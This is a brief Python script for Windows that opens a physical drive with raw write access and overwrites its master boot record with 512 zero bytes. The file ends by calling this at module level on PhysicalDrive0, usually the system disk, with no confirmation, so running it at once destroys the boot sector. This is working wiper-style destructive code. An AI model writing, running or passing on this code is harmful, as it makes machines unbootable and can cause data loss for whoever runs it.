import ctypes
import win32api
import win32file

# Function to delete the MBR
def delete_mbr(drive):
    # Ensure the drive path is correct (e.g., \\.\PhysicalDrive0)
    if not drive.startswith('\\\\.\\PhysicalDrive'):
        raise ValueError("Invalid drive path. It should start with \\\\.\\PhysicalDrive")
    
    # Open the drive with write access
    handle = win32file.CreateFile(
        drive,
        win32file.GENERIC_WRITE,
        win32file.FILE_SHARE_READ | win32file.FILE_SHARE_WRITE,
        None,
        win32file.OPEN_EXISTING,
        0,
        None
    )
    
    if handle == win32file.INVALID_HANDLE_VALUE:
        raise ctypes.WinError(ctypes.get_last_error())

    try:
        # Write 512 bytes of zeros to the start of the drive (MBR)
        zero_data = bytes(512)
        win32file.WriteFile(handle, zero_data, None)
    finally:
        # Close the handle
        win32file.CloseHandle(handle)

# Example usage
drive_path = '\\\\.\\PhysicalDrive0'  # Replace with the correct physical drive number
delete_mbr(drive_path)
